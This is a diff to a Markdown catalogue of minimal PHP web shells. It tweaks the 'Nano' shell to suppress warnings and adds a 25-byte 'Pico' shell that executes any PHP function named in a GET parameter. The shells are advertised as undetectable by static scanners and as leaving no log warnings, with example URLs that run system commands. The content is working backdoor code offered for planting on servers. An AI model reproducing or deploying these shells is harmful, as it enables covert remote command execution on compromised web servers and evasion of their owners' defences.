@@ -7,12 +7,13 @@ For example, if short tags are disabled, you will need to replace <? with <?php.
 
 ### Nano
 ```php
-<?$x=$_GET;($x[p]=='_'?$x[f]($x[c]):y);
+<?$x=$_GET;(@$x[p]=='_'?@$x[f]($x[c]):1);
 ```
 #### Features
-- 39 bytes in size
+- 41 bytes in size
 - Can't be detected by static code scanners
 - Supports authentication
+- No warnings on this fork version!
 
 #### Usage
 `http://example.com/nano.php?f=function&c=command&p=password`
@@ -24,6 +25,25 @@ For example, if short tags are disabled, you will need to replace <? with <?php.
 For example, the code below will execute the `ls` command:
 
 `http://example.com/nano.php?f=system&c=ls&p=password`
+
+###Pico
+```php
+<?$x=$_GET;@$x[f]($x[c]);
+```
+#### Features
+- 25 bytes in size
+- Can't be detected by static code scanners
+- No warnings on server logs!
+
+#### Usage
+`http://example.com/nano.php?f=function&c=command`
+
+`f` is for function\
+`c` is for command
+
+For example, the code below will execute the `ls` command:
+
+`http://example.com/nano.php?f=system&c=ls`
 
 ### Ninja
 ```php
